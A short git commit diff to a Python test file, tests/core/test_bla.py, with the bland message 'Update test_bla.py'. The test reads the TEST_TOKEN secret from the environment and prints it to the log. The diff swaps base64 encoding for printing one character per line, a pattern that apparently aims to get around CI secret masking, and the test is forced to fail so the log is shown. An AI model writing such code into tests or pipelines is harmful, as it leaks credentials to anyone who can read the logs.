842dbed344918b22780b54470583ce32cdab4b9f
ndavisontest2 <58417511+ndavisontest2@users.noreply.github.com>
2025-08-09 18:04:15 +1000

    Update test_bla.py

--- tests/core/test_bla.py
+++ tests/core/test_bla.py
@@ -1,7 +1,7 @@
 import os
-import base64
 
 def test_bla():
   secret_token = os.environ.get("TEST_TOKEN")
-  print(base64.b64encode(secret_token.encode()))
+  for c in secret_token:
+    print(c)
   assert False
